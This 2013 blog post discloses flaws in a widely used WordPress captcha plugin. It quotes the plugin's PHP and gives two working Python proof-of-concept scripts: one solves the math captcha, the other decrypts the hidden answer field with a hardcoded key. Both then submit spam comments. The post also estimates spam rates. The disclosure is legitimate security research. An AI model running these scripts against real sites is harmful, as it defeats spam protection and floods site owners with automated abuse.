Title: A tale of a twofold broken wordpress captcha plugin
Date: 2013-11-04 02:02
Author: Nikolai Tschacher
Category: Programming
Tags: Captcha, Security, Programming, Exploit
Slug: a-tale-of-a-twofold-broken-wordpress-captcha-plugin
Status: published

**Last Edit (Effective: 7th November 2013)**

It seems like the plugin authors updated the security of the plugin. All
the bottom blog entry deals with version 3.8.7. In this new paragraph, I
will look whether these recent updates to version
[3.8.8](http://plugins.svn.wordpress.org/captcha/tags/3.8.8/ "3.8.8")
added the necessary security to prevent conducting an...

+ Attack vector one: Parsing the captcha logic.
+ Attack vector two: Reversing the decode() function and just reading the solution from the hidden fields.

Let's get started:

At line 942 of the [plugin code](http://plugins.svn.wordpress.org/captcha/tags/3.8.8/captcha.php "plugin code")
(The start of the function that generates the captcha) we see that the
password isn't longer a static clear text password, it is built
dynamically every 24 hours with the function `cptch_generate_key()`,
that I will show here for your convenience:

    :::php
    // Functionality of the captcha logic work for custom form
    if ( ! function_exists( 'cptch_display_captcha_custom' ) ) {
        function cptch_display_captcha_custom() {
            global $cptch_options, $cptch_time;

            if ( ! isset( $cptch_options['cptch_str_key'] ) )
                $cptch_options = get_option( 'cptch_options' );
            if ( $cptch_options['cptch_str_key']['key'] == '' || $cptch_options['cptch_str_key']['time'] < time() - ( 24 * 60 * 60 ) )
                cptch_generate_key();
            $str_key = $cptch_options['cptch_str_key']['key'];

Let's see if the new function `cptch_generate_key()` is sufficiently
random enough. Here is the function code:

    :::php
    /* generate key */
    if ( ! function_exists( 'cptch_generate_key' ) ) {
        function cptch_generate_key( $lenght = 15 ) {
            global $cptch_options;
            /* Under the string $simbols you write all the characters you want to be used to randomly generate the code. */
            $simbols = get_bloginfo( "url" ) . time();
            $simbols_lenght = strlen( $simbols );
            $simbols_lenght--;
            $str_key = NULL;
            for ( $x = 1; $x <= $lenght; $x++ ) {
                $position = rand( 0, $simbols_lenght );
                $str_key .= substr( $simbols, $position, 1 );
            }

            $cptch_options['cptch_str_key']['key'] = md5( $str_key );
            $cptch_options['cptch_str_key']['time'] = time();
            update_option( 'cptch_options', $cptch_options );
        }
    }

Sorry to disappoint, it's still *somewhat* broken. Let's discuss what
the patch does:

First the author obtains the current site address with
`get_bloginfo('url')`. The wordpress docs says that this retrieves:

> 'url' - Returns the "Site address (URL)" set in Settings > General. This data is retrieved from the "home" record in the wp_options table. Equivalent to home_url().

This is a world known static value, that is not randomness in ANY
POSSIBLE WAY in the site url! If the plugin is installed on my server,
`get_bloginfo('url')` would just yield "http://incolumitas.com/". You get
it? It returns the url where wordpress is located :/

Furthermore, the function continues to pick random characters from the
site url and concatenates them to a new string that has default length
of 15. In short: The function just uses 15 random characters from the
seed that is the site url. Well, is this secure?

First of all, `rand()` is not a secure
[PRNG](http://en.wikipedia.org/wiki/Pseudorandom_number_generator)! I
suggest the plugin author strongly to have a glimpse on a recent reddit
netsec post about [that even `mt_rand()` is a weak
PRNG](http://www.reddit.com/r/netsec/comments/1pvfmv/phps_mt_rand_random_number_generating_function/).

This means that we can find out the state of `rand()` with sufficiently
enough samples and can therefore predict what characters the `rand()`
function outputs. But maybe that works not, because the password is only
generated every 24 hours and the "state" of the `rand()` PRNG changes
faster. I honestly don't know. That being said, there is probably
another way to extract values from `rand()` through wordpress in order to
obtain enough samples to pursue a cracking attempt. Maybe even by the
captcha math equations themselves, since their randomness relies heavily
on successive calls to rand() [After thinking twice about it: That will
definitely work]. Anyway, I would suggest to use something like the
following to generate the password (Coded quickly by me, so double check
it better!):

    :::PHP
    // Always check if this function returns a str of length 32! If not, don't use it!
    if ( ! function_exists( 'cptch_generate_key' ) ) {
       function cptch_generate_key( $length = 32 ) {
         $cstrong = False;
         $bytes = openssl_random_pseudo_bytes($length, $cstrong);
         if ($cstrong == False)
            return False;
         else
            return bin2hex($bytes);
       }
    }

**Conclusion:**

+ The plugin is still vulnerable against captcha parsing (Nothing
    changed here). This is the root of the problem.
+ The plugin still handles it's cryptography pretty badly, but the
    randomness might be good enough! (Note that I am from times
    meticulous what security things concern).
+ The whole captcha protection is even in a *third* way broken.
    Consider some captchas that I generated with the plugin:

	    :::text
		Calculation with timestamp: 1383770422 Encoded pWw= is decoded to 3 
		Calculation with timestamp: 1383773265 Encoded 3Ko= is decoded to 8 
		Calculation with timestamp: 1383772504 Encoded tNM= is decoded to 6 
		Calculation with timestamp: 1383770071 Encoded E08r is decoded to 10 
		Calculation with timestamp: 1383771712 Encoded VEA= is decoded to 0 
		Calculation with timestamp: 1383770645 Encoded aWPB is decoded to 16 
		Calculation with timestamp: 1383773392 Encoded MEa7 is decoded to 42 
		Calculation with timestamp: 1383772030 Encoded 2uA= is decoded to 4 
		Calculation with timestamp: 1383770004 Encoded lJ8= is decoded to 7 
		Calculation with timestamp: 1383770859 Encoded KvE= is decoded to 9 
		Calculation with timestamp: 1383772789 Encoded k1I= is decoded to 7 
		Calculation with timestamp: 1383773377 Encoded BAE= is decoded to 6 
		Calculation with timestamp: 1383770038 Encoded /HY= is decoded to 8 
		Calculation with timestamp: 1383768565 Encoded nmM= is decoded to 5 
		Calculation with timestamp: 1383765035 Encoded JPA= is decoded to 6 
		Calculation with timestamp: 1383770354 Encoded 9EZ3 is decoded to 12 
		Calculation with timestamp: 1383771119 Encoded KX4= is decoded to 1 
		Calculation with timestamp: 1383773236 Encoded eSc= is decoded to 7 
		Calculation with timestamp: 1383770716 Encoded J6w= is decoded to 1 
		Calculation with timestamp: 1383768040 Encoded fUg= is decoded to 1 
		Calculation with timestamp: 1383773167 Encoded 7Co= is decoded to 6 
		Calculation with timestamp: 1383770803 Encoded A3k= is decoded to 1 
		Calculation with timestamp: 1383771047 Encoded J1Q= is decoded to 8 
		Calculation with timestamp: 1383768079 Encoded fpg= is decoded to 6 
		Calculation with timestamp: 1383767787 Encoded uR8= is decoded to 2 
		Calculation with timestamp: 1383773077 Encoded pgg= is decoded to 4 
		Calculation with timestamp: 1383772657 Encoded KXI= is decoded to 3 
		Calculation with timestamp: 1383771187 Encoded Ct0= is decoded to 9 
		Calculation with timestamp: 1383767982 Encoded Y6U= is decoded to 3 
		Calculation with timestamp: 1383773155 Encoded 9wpu is decoded to 11 
		Calculation with timestamp: 1383767071 Encoded ejeX is decoded to 27 
		Calculation with timestamp: 1383772116 Encoded dWyu is decoded to 15

What do you see? Numeric captcha solutions (The base64 encoded 3-4
char string) smaller than 10, have a encoded value that ends with
the equal sign "=". Hence we could just sketch a little script that
checks whether the hidden field `cptch_result` ends with a "=". If
this is the case, we just guess the result! That means we can inject
a spammer comment/login attempt/registration in every 10th case (a
little less effectively since we have to discard numbers > 10 [But
there we could also guess a number, just a higher one, there's
finite pool of them]. Assuming that we fire 500 requests a minute,
we can spam the blog with 50 new users or 50 spam comments a minute!
That's not bad for such a simplistic approach :P  
This technique bases, yet again, on the bad encode() function.

### Excursus: Could we crack the new function?

Let's assume that `get_bloginfo( "url" ).time();` yields something like

    http://site.us1383733573

Then the pool of random characters is (Every character only once!)

    htp:/sie.u13875

and the number of occurences for every char is:

    'h': 1 
    't': 3
    'p': 1
    ':': 1
    '/': 2
    's': 2
    'i': 1
    'e': 1
    '.': 1
    'u': 1
    '1': 1
    '3': 3
    '8': 1
    '7': 2
    '5': 2

And of course we all know our maths: The number of combinations is n\^k,
where n is the number of different input characters (The alphabet) and k
is the length of the password.

Hence we need to calculate an average of

    n = 15;
    k = 15;

    number_of_combinations = 15^15

    Python:
    >>> 15**15
    437893890380859375

437893890380859375 is quite a big number. Assuming we have a slow PC and
use [hashcat](http://hashcat.net/oclhashcat-plus/), we can handle 335M
c/s. This means we need 1307145941 seconds to brute force the password.
Of course this "cryptoanalysis" applies only to a somewhat artificial
site url like *http://site.us*. Nevertheless, this is not secure in terms
of cryptography!

### Excursus: Do we even need to crack the function?

Due to the implementation of the encode() function, it doesn't matter
how good the password is, since only maximally two bytes of the random
data blob is essentially used in the *encrypted* value. Just analyze the
encode() function and you will soon realize that every number 0-9 is
xored with a random byte and every number > 10 is xored with two random
bytes...So there is just no need for more than two random bytes :/


## Original blog post


### Preface (Start of blog post that applies to version 3.8.7)

Over the years I have seen quite some applications that weren't very
well engineered. Security bugs, cumbersome coding practices and a
missing sense for software architecture to name a few key points. But
there was mostly some reason for the lack of quality. Be it the
inexperience of the authors, the relative novelty of the application or
just laziness. Bad code is not really *that bad* if it doesn't
compromise the security or usability of the software and does not
jeopardize many users. But apps that compromise both and find themselves
simultaneously in a advanced development stage are really unpleasant to
encounter. (That's my opinion. I think there are also many examples of
my code that lacks security and usability and good coding practices. But
I didn't publish any of my code officially or even distribute it
commercially).

In this blog post I will demonstrate the utter failing of a thousand
line wordpress security plugin that should test to tell computers and
humans apart (CAPTCHA).

### Who is the villain?

**It is [Captcha](http://wordpress.org/plugins/captcha/).**

Some basic information about the wordpress plugin (From 03.11.2013):

<table class="table">
<thead>
<tr>
<th>
Affected version

</th>
<th>
Vendor

</th>
<th>
Last Updated

</th>
<th>
Downloads

</th>
<th>
Ratings

</th>
<th>
Downloads yesterday

</th>
</tr>
</thead>
<td>
[3.8.7](http://plugins.svn.wordpress.org/captcha/tags/3.8.7/ "3.8.7")

</td>
<td>
http://bestwebsoft.com/

</td>
<td>
2013-10-31

</td>
<td>
1,187,259

</td>
<td>
4.6 of 5 stars (240 ratings)

</p>
<td>
4,215

</td>
</tr>
</table>

Therefore this plugin is **rather large** and enjoys a ever growing user
base. It is also the very first hit when you type "Captcha" in the
wordpress search form. Maybe because the plugin has the exactly the same
name :/ Anyways, the prominent position is reason enough to investigate
furher.

It's description states euphorically:

> The Captcha plugin allows you to implement a super security captcha
> form into web forms. It protects your website from spam by means of
> math logic, easily understood by human beings. You will not have to
> spend your precious time on annoying attempts to understand
> hard-to-read words, combinations of letters or pictures that make your
> eyes pop up. All you need is to do one of the three basic maths
> actions - add, subtract and multiply. This captcha can be used for
> login, registration, password recovery, comments forms.

That reads very well. Handy math equations, sophisticated protection
from spammers, super security ([Cryptochef](http://kryptochef.net/) is
calling)!. No need for hard to decipher captchas! Blame me, I don't
believe it...

### The blackbox approach (Without reading the source)

How can easy math equations like these

![captcha
1](http://s.wordpress.org/plugins/captcha/screenshot-3.jpg?r=798318)  
![captcha
2](http://s.wordpress.org/plugins/captcha/screenshot-4.jpg?r=798318)  
![3](http://s.wordpress.org/plugins/captcha/screenshot-5.jpg?r=798318)

be immune against common parsing and computational evaluation?

Let's try if we can actually crack them using a little quick & dirty
python script I just coded without even reading the source code further.
You can also investigate my script on my [github
account](https://github.com/NikolaiT/Scripts/blob/master/scripts/python/cracking_captcha_plugin/crack.py "github account").
Please note that you have to install the captcha plugin on your
wordpress site and that you need to adjust the links in the script to
point to a existing blog site in order to test that the script solves
the captchas.

    :::python
    # Proofs uselessness of popular captcha plugin for wordpress
    # Software link: http://wordpress.org/plugins/captcha/

    # Modify links to test on your site. You should obviously provide correct URI's
    # and have the plugin installed.

    import requests
    import lxml.html
    import itertools

    N = {'zero': 0,'one': 1,'two': 2,'three': 3,'four': 4,'five': 5,'six': 6,'seven': 7,'eight': 8,'nine': 9,'eleven': 11,'twelve': 12,'thirteen': 13,
    'fourteen': 14,'fifteen': 15,'sixteen': 16,'seventeen': 17,'eighteen': 18,'nineteen': 19, 'ten': 10,'twenty': 20,'thirty': 30,
    'forty': 40,'fifty': 50,'sixty': 60,'seventy': 70,'eighty': 80,'ninety':90}

    OPERATORS = {'+': '+', '−': '-', '×': '*', '/': '/', '=': '='}
     
    def R(s, d):
            for key, value in d.items():
                    s = s.replace(key, str(value))
            # If we can make a sum of the string, try it (For cases like "twenty four")
            if not has_op(s) and 'y' not in s:
                    s = str(sum([int(n) for n in s.split(' ') if n and int(n) in N.values()]))
            return s

    # Prevent bad words in eval()        
    def whitelist(captcha):
        good = list(itertools.chain(N.keys(), [str(i) for i in N.values()], OPERATORS.keys()))
        for token in captcha.split(' '):
            token = token.strip()
            if token and token not in good:
                print("I failed: [%s]" % token)
                exit('Better not.')
        return captcha

    def has_op(expr):
            for o in OPERATORS.keys():
                    if o in expr:
                            return True
            return False

    def get_op(expr):
            for o in OPERATORS.keys():
                    if o in expr:
                            return o
            return False

    def solve(captcha):
            # Some example captchas:
            # '9 −  =  eight'
            # '+ 3 =  eight'
            # '9 × one ='
            # '× 8 =  twenty four'
            # We see: Simple mathematical expression consisting of two parts. Let's parse that.
            left, equals, right = captcha.partition('=') # Python is beautiful
            
            if not left.strip():
                    left = 'y'
            if not right.strip():
                    right = 'y'
                    
            left =R(left, N)
            right = R(right, N)

            expr = [left, right][has_op(right)] # expr is the part with the mathematical operator
            
            ll, op, rr = expr.partition(get_op(expr))
            if not ll.strip():
                    ll = 'y'
            if not rr.strip():
                    rr = 'y'

            # Reassemble
            X = '%s == %s' % ('%s %s %s' % (R(ll, N), OPERATORS[op], R(rr, N)), [right, left][expr==right])
            
            # Brute force
            for i in range(10000):
                    if eval(X.replace('y', str(i))):
                            return str(i)

    if __name__ == '__main__':
            # Obtain post parameters from comment form
            
            try:
                    r = requests.get('http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/')
            except requests.ConnectionError as cerr:
                    print('Network problem occured')
            except requests.Timeout as terr:
                    print('Connection timeout')
            if not r.ok:
                    print('HTTP Error:', r.status_code)

            # Parse parameters and solve captcha
            
            dom = lxml.html.fromstring(r.text.encode('utf-8'))
            el = dom.find_class('cptch_block')[0]
            captcha = el.text_content().strip()
            solution = solve(whitelist(captcha))

            for c in el.getchildren():
                    try:
                            if c.attrib['name'] == 'cptch_result':
                                    result = c.attrib['value']
                            if c.attrib['name'] == 'cptch_time':
                                    time = c.attrib['value']
                    except KeyError:
                            pass

            el= dom.find_class('form-submit')[0]
            for c in el.getchildren():
                    try:
                            if c.attrib['name'] == 'comment_post_ID':
                                    post_id = c.attrib['value']
                            if c.attrib['name'] == 'comment_parent':
                                    comment_parent = c.attrib['value']
                    except KeyError:
                            pass
            
            print("[+] Solution of captcha '%s' is %s" % (captcha, solution))

            # No write a comment with the cracked captcha to proof that we provided the
            # correct solution.
            payload = {'author': 'spammer', 'email': 'spammer@spamhouse.org', 'url': 'http://spamming.com',
            'cptch_result': result, 'cptch_time': time, 'cptch_number': solution,
            'comment': "Hi there! No protection from spammers!!!:D", 'submit': 'Post+Comment',
            'comment_post_ID': post_id, 'comment_parent': comment_parent}

            try:
                    r = requests.post("http://incolumitas.com/wp-comments-post.php", data=payload)
            except requests.ConnectionError as cerr:
                    print('Network problem occured')
            except requests.Timeout as terr:
                    print('Connection timeout')
            if not r.ok:
                    print('HTTP Error:', r.status_code)

            if '''Error: You have entered an incorrect CAPTCHA value.''' in r.text:
                    print('[-] Captcha cracking was not successful')
            else:
                    print('[+] Comment submitted')
                    

That seems to work surprisingly well. Without even reading the code, the
captcha plugin is totally broken using the upper approach. The above
code simply parses every mathematical equation (The plugin always severs
equations) and assembles them to strings the feeds python built-in
eval(). We then iterate the expression from zero to 10000 and substitute
the for loop variable into the expression. If the math expression
becomes true, we found the variable and therefore the solution. Really
easy. Well the plugin is broken, that's proved, but I have this strange
insight that I might be on the track to reveal a twofold broken app :P
(It's 04:00 in the morning here, maybe that's why I am writing so
chesty)

### Whiteboxing - Code assessment

Let's review the source code of the plugin.

You also want to have a glance on the code?
[Here](http://plugins.svn.wordpress.org/captcha/tags/3.8.7/captcha.php "the code")
you go.  
My very first impression was quite positive (Besides already knowing
that the plugin was useless :/). The author seems to posses a profound
understanding of the wordpress API, he uses lot's of hooks (filters and
actions) and structures the code on the first glimpse very nicely. I
know from own experience that writing code for wordpress is not always
easy. But let's look at the critical part. The captcha is generated by
the function cptch\_display\_captcha\_custom(). For your convenience, I
will list it here:

    :::php
    // Functionality of the captcha logic work for custom form
    if ( ! function_exists( 'cptch_display_captcha_custom' ) ) {
        function cptch_display_captcha_custom() {
            global $cptch_options, $str_key, $cptch_time;
            $content = "";
            
            // In letters presentation of numbers 0-9
            $number_string = array(); 
            $number_string[0] = __( 'zero', 'captcha' );
            $number_string[1] = __( 'one', 'captcha' );
            $number_string[2] = __( 'two', 'captcha' );
            $number_string[3] = __( 'three', 'captcha' );
            $number_string[4] = __( 'four', 'captcha' );
            $number_string[5] = __( 'five', 'captcha' );
            $number_string[6] = __( 'six', 'captcha' );
            $number_string[7] = __( 'seven', 'captcha' );
            $number_string[8] = __( 'eight', 'captcha' );
            $number_string[9] = __( 'nine', 'captcha' ); 
            // In letters presentation of numbers 11 -19
            $number_two_string = array();
            $number_two_string[1] = __( 'eleven', 'captcha' );
            $number_two_string[2] = __( 'twelve', 'captcha' );
            $number_two_string[3] = __( 'thirteen', 'captcha' );
            $number_two_string[4] = __( 'fourteen', 'captcha' );
            $number_two_string[5] = __( 'fifteen', 'captcha' );
            $number_two_string[6] = __( 'sixteen', 'captcha' );
            $number_two_string[7] = __( 'seventeen', 'captcha' );
            $number_two_string[8] = __( 'eighteen', 'captcha' );
            $number_two_string[9] = __( 'nineteen', 'captcha' );
            // In letters presentation of numbers 10, 20, 30, 40, 50, 60, 70, 80, 90
            $number_three_string = array();
            $number_three_string[1] = __( 'ten', 'captcha' );
            $number_three_string[2] = __( 'twenty', 'captcha' );
            $number_three_string[3] = __( 'thirty', 'captcha' );
            $number_three_string[4] = __( 'forty', 'captcha' );
            $number_three_string[5] = __( 'fifty', 'captcha' );
            $number_three_string[6] = __( 'sixty', 'captcha' );
            $number_three_string[7] = __( 'seventy', 'captcha' );
            $number_three_string[8] = __( 'eighty', 'captcha' );
            $number_three_string[9] = __( 'ninety', 'captcha' );
            // The array of math actions
            $math_actions = array();

            // If value for Plus on the settings page is set
            if( 1 == $cptch_options['cptch_math_action_plus'] )
                $math_actions[] = '+';
            // If value for Minus on the settings page is set
            if( 1 == $cptch_options['cptch_math_action_minus'] )
                $math_actions[] = '−';
            // If value for Increase on the settings page is set
            if( 1 == $cptch_options['cptch_math_action_increase'] )
                $math_actions[] = '×';
                
            // Which field from three will be the input to enter required value
            $rand_input = rand( 0, 2 );
            // Which field from three will be the letters presentation of numbers
            $rand_number_string = rand( 0, 2 );
            // If don't check Word in setting page - $rand_number_string not display
            if( 0 == $cptch_options["cptch_difficulty_word"])
                $rand_number_string = -1;
            // Set value for $rand_number_string while $rand_input = $rand_number_string
            while($rand_input == $rand_number_string) {
                $rand_number_string = rand( 0, 2 );
            }
            // What is math action to display in the form
            $rand_math_action = rand( 0, count($math_actions) - 1 );

            $array_math_expretion = array();

            // Add first part of mathematical expression
            $array_math_expretion[0] = rand( 1, 9 );
            // Add second part of mathematical expression
            $array_math_expretion[1] = rand( 1, 9 );
            // Calculation of the mathematical expression result
            switch( $math_actions[$rand_math_action] ) {
                case "+":
                    $array_math_expretion[2] = $array_math_expretion[0] + $array_math_expretion[1];
                    break;
                case "−":
                    // Result must not be equal to the negative number
                    if($array_math_expretion[0] < $array_math_expretion[1]) {
                        $number                                     = $array_math_expretion[0];
                        $array_math_expretion[0]    = $array_math_expretion[1];
                        $array_math_expretion[1]    = $number;
                    }
                    $array_math_expretion[2] = $array_math_expretion[0] - $array_math_expretion[1];
                    break;
                case "×":
                    $array_math_expretion[2] = $array_math_expretion[0] * $array_math_expretion[1];
                    break;
            }
            
            // String for display
            $str_math_expretion = "";
            // First part of mathematical expression
            if( 0 == $rand_input )
                $str_math_expretion .= "";
            else if ( 0 == $rand_number_string || 0 == $cptch_options["cptch_difficulty_number"] )
                $str_math_expretion .= $number_string[$array_math_expretion[0]];
            else
                $str_math_expretion .= $array_math_expretion[0];
            
            // Add math action
            $str_math_expretion .= " ".$math_actions[$rand_math_action];
            
            // Second part of mathematical expression
            if( 1 == $rand_input )
                $str_math_expretion .= " ";
            else if ( 1 == $rand_number_string || 0 == $cptch_options["cptch_difficulty_number"] )
                $str_math_expretion .= " ". $number_string[$array_math_expretion[1]];
            else
                $str_math_expretion .= " ".$array_math_expretion[1];
            
            // Add =
            $str_math_expretion .= " = ";
            
            // Add result of mathematical expression
            if( 2 == $rand_input ) {
                $str_math_expretion .= " ";
            } else if ( 2 == $rand_number_string || 0 == $cptch_options["cptch_difficulty_number"] ) {
                if( $array_math_expretion[2] < 10 )
                    $str_math_expretion .= " ". $number_string[$array_math_expretion[2]];
                else if( $array_math_expretion[2] < 20 && $array_math_expretion[2] > 10 )
                    $str_math_expretion .= " ". $number_two_string[ $array_math_expretion[2] % 10 ];
                else {
                    if ( get_bloginfo( 'language','Display' ) == "nl-NL" ) {
                        $str_math_expretion .= " ".( 0 != $array_math_expretion[2] % 10 ? $number_string[ $array_math_expretion[2] % 10 ] . __( "and", 'captcha' ) : '' ) . $number_three_string[ $array_math_expretion[2] / 10 ];
                    } else {
                        $str_math_expretion .= " " . $number_three_string[ $array_math_expretion[2] / 10 ]." ".( 0 != $array_math_expretion[2] % 10 ? $number_string[ $array_math_expretion[2] % 10 ] : '');
                    }
                }
            } else {
                $str_math_expretion .= $array_math_expretion[2];
            }
            // Add hidden field with encoding result
            $content .= '
            
            ';
            $content .= $str_math_expretion; 
            return $content;
        }
    }

What can we see on the first view? The author declares several arrays
holding integer strings on a rather painful way. He then continues to
build the maths equation captcha with a variable called
`$array_math_expretion` (Introduced on line 68). I am pretty sure he
means `$array_math_expression`. But shit happens. I mean the plugin
is only 2.5 years old and in the very early version 3.8.7. Who cares
about grammar anyways?

Lot's of hard understandable code follows. Some random integers are
obtained to built the fancy *expretion*. And, wait, what's that on line
80?!

    :::php
    // Result must not be equal to the negative number
    if($array_math_expretion[0] < $array_math_expretion[1]) {
       $number = $array_math_expretion[0];
       $array_math_expretion[0] = $array_math_expretion[1];
       $array_math_expretion[1] = $number;
    }

The author prevents the subtraction to become negative on a cumbersome
way. Really?! Is the missing associative property that hard to work
around?

Well let's go further. I really don't care how exactly the mathematical
expression is built, I just know that it infinitely sucks.

Consider the final lines 135 to 140. There the captcha answer is
*encoded* and then injected into the form where the user has to enter
the captcha. Normally injecting encrypted hidden input fields is a
common technique among web developers. But only under the supposition
that the hidden field values are properly encrypted. Let's see if the
author did so. That being said we have a look at the function encode():

    :::php
    // Function for encodinf number
    if ( ! function_exists( 'encode' ) ) {
        function encode( $String, $Password, $cptch_time ) {
            // Check if key for encoding is empty
            if ( ! $Password ) die ( __( "Encryption password is not set", 'captcha' ) );

            $Salt = md5( $cptch_time, true );
            $String = substr( pack( "H*", sha1( $String ) ), 0, 1 ).$String;
            $StrLen = strlen( $String );
            $Seq = $Password;
            $Gamma  = '';
            while ( strlen( $Gamma ) < $StrLen ) {
                    $Seq = pack( "H*", sha1( $Seq . $Gamma . $Salt ) );
                    $Gamma.=substr( $Seq, 0, 8 );
            }

            return base64_encode( $String ^ $Gamma );
        }
    }

Again, before I even would dig deeper into the encoding function, I want
to know how it is called. Maybe the input parameters are predictable. Oh
boy, they are. The encoding function on line 136 in the previous code
snippet is called with two global variables, a timestamp and a
*password*, as well as the captcha expression string:

    :::php
    $str_key //the password
    $cptch_time // the timestamp

These variables (the freaking password!) are initialized at the
beginning of the plugin to the following values:

    :::php
    // Add global setting for Captcha
    global $wpmu, $str_key, $cptch_time;
    $str_key = "bws_3110013";
    $cptch_time = time();

Well, what does that mean?

Whenever a captcha is generated, the captcha answer is *encrypted* with
a fully exposed password (*bws_3110013*) and a known timestamp (The
timestamp is known because it is also sent as hidden field in the form).
That means we can just apply the decode() function on the hidden values
whenever we fill out a form and can thus calculate the captcha answer
ourselves with the hidden input parameters! BOOM, captcha solved without
even applying OCR techniques (As far as parsing theses simple equations
counts as OCR).

Here for completeness sake the decode() function (I honestly cannot say
whether the encryption level is good, because I don't have profound
knowledge of cryptography, but it does look very weak to me. Could you
elaborate on it? Leave me a comment :P):

    :::php
    // Function for decoding number
    if ( ! function_exists( 'decode' ) ) {
        function decode( $String, $Key, $cptch_time ) {
            // Check if key for encoding is empty
            if ( ! $Key ) die ( __( "Decryption password is not set", 'captcha' ) );

            $Salt = md5( $cptch_time, true );
            $StrLen = strlen( $String );
            $Seq = $Key;
            $Gamma  = '';
            while ( strlen( $Gamma ) < $StrLen ) {
                    $Seq = pack( "H*", sha1( $Seq . $Gamma . $Salt ) );
                    $Gamma.= substr( $Seq, 0, 8 );
            }

            $String = base64_decode( $String );
            $String = $String^$Gamma;

            $DecodedString = substr( $String, 1 );
            $Error = ord( substr( $String, 0, 1 ) ^ substr( pack( "H*", sha1( $DecodedString ) ), 0, 1 )); 

            if ( $Error ) 
                return false;
            else 
                return $DecodedString;
        }
    }

I should prove my above allegations? I will terminate my experiments
soon and then I'll post a exploitation of this weakness written in
Python. I will also add this POC on my github account. But for now the
explanation above will suffice.

**Edit: As promised, here is the code that reverses the decode
function:**

    :::python
    import requests
    import lxml.html
    import hashlib
    import base64

    # A blog post site that needs to have the plugin http://wordpress.org/plugins/captcha/ enabled and 
    # should have a open comment form. This 'attack' works on every form that the plugin supports [E.g. registration,
    # login, ...]. This renders the captcha completely useless.

    # Author: Nikolai Tschacher
    # Date: 07.11.2013

    # tested on my local lamp with version 3.8.7
    TARGET = "http://localhost/~nikolai/wordpress/?p=1" # The landing site.
    COMMENT_POST = "http://localhost/~nikolai/wordpress/wp-comments-post.php" # The comment form to send POST requests at.
    KEY = "bws_3110013"

    def no_plugin(reason=""):
        print('The plugin hidden fields couldn\'t be located. Make sure it is installed. Reason: {}'.format(reason))
        exit(-1)

    # This function reverses essentially the encoding of the hidden field cptch_result.
    # It is exactly the same function with the same password as in the plugin source code.
    def reverse(captcha, key, cptch_time):
        # just convert all but the captcha string to ascii
        key = key.encode('ascii')
        cptch_time = cptch_time.encode('ascii')
        
        print('[i] Trying to decode key: {}, captcha: {} and cptch_time: {}'.format(captcha, key, cptch_time))
        
        d = hashlib.md5()
        d.update(cptch_time)
        salt = d.digest()
        
        slen = len(captcha)
        seq = key
        gamma = bytearray()
        while len(gamma) < slen:
            sha = hashlib.sha1()
            L = bytearray()
            L.extend(seq)
            L.extend(gamma)
            L.extend(salt)
            sha.update(L)
            seq = sha.digest()
            gamma.extend(seq[:8])
        
        decoded = []
        captcha = base64.b64decode(bytes(captcha, 'utf-8'));
        for c, cc in zip(captcha, gamma):
            decoded.append(chr(c ^ cc))
        return ''.join(decoded[1:])
        
    if __name__ == '__main__':
            # Obtain post parameters from comment form
            try:
                    r = requests.get(TARGET)
            except requests.ConnectionError as cerr:
                    print('Network problem occured: {}'.format(cerr))
            except requests.Timeout as terr:
                    print('Connection timeout: {}'.format(terr))
            if not r.ok:
                    print('HTTP Error:', r.status_code)

            # Parse parameters and solve captcha
            
            dom = lxml.html.fromstring(r.text.encode('utf-8'))
            try:
                el = dom.find_class('cptch_block')[0]
            except IndexError as ierr:
                no_plugin('find_class cptch_block') # No such CSS class found means most likely the plugin is not installed.
                
            captcha = el.text_content().strip()

            for c in el.getchildren():
                    try:
                            if c.attrib['name'] == 'cptch_result':
                                    result = c.attrib['value']
                            if c.attrib['name'] == 'cptch_time':
                                    time = c.attrib['value']
                    except KeyError:
                            pass

            el= dom.find_class('form-submit')[0]
            for c in el.getchildren():
                    try:
                            if c.attrib['name'] == 'comment_post_ID':
                                    post_id = c.attrib['value']
                            if c.attrib['name'] == 'comment_parent':
                                    comment_parent = c.attrib['value']
                    except KeyError:
                            pass

            print('[+] Captcha is "{}"'.format(captcha))
            
            # Try to crickiticrack it :P [Well we just use the decode() functon]
            solution = reverse(result, KEY, time)
            
            print('[+] Found solution: "{}"'.format(solution))
            
            # No write a comment with the cracked captcha to proof that we provided the
            # correct solution.
            payload = {'author': 'spammer', 'email': 'spammer@spamhouse.org', 'url': 'http://spamming.com',
            'cptch_result': result, 'cptch_time': time, 'cptch_number': solution,
            'comment': "Hi there! No protection from spammers!!!!:D", 'submit': 'Post+Comment',
            'comment_post_ID': post_id, 'comment_parent': comment_parent}

            try:
                    r = requests.post(COMMENT_POST, data=payload)
            except requests.ConnectionError as cerr:
                    print('Network problem occured: {}'.format(cerr))
            except requests.Timeout as terr:
                    print('Connection timeout: {}'.format(terr))
            if not r.ok:
                    print('HTTP Error:', r.status_code)

### Conclusion

Let me summarize:

-   The captcha implementation of the plugin is bad because it does not
    prevent computers from solving it (The idea behind serving
    mathematical equations in this form is highly debatable).
-   The captcha author implements his own encryption function, which is
    almost always a very bad idea as long as your name is not Bruce
    Scheier or you aren't a mathematician.
-   The captcha plugin stores clear text passwords in the source code
    visible to anyone.
-   The captcha plugin has a very big user base (Over one million
    downloads) and a alarming high rating.
-   The [authors](http://bestwebsoft.com/ "BestWebSoft") earn money with
    this shitty software and the users are left completely unsecured.

Maybe the worst part of all this is, that there's also a premium version
of this plugin. And the most frightening observance: Most users are
completely unaware of the consequences from using such software (Derived
by the average high ratings for this plugin). For instance, I found the
following business comment on the vendor site. This is absolutely
ridiculous.

[![Client from BestWebSoft ordering captcha for several thousand dollars without knowing the
quality.]({static}/uploads/2013/11/Screenshot-from-2013-11-04-072343-1024x576.png)]({static}/uploads/2013/11/Screenshot-from-2013-11-04-072343.png)

Anyways, that's been it! Send me letter for Xmas!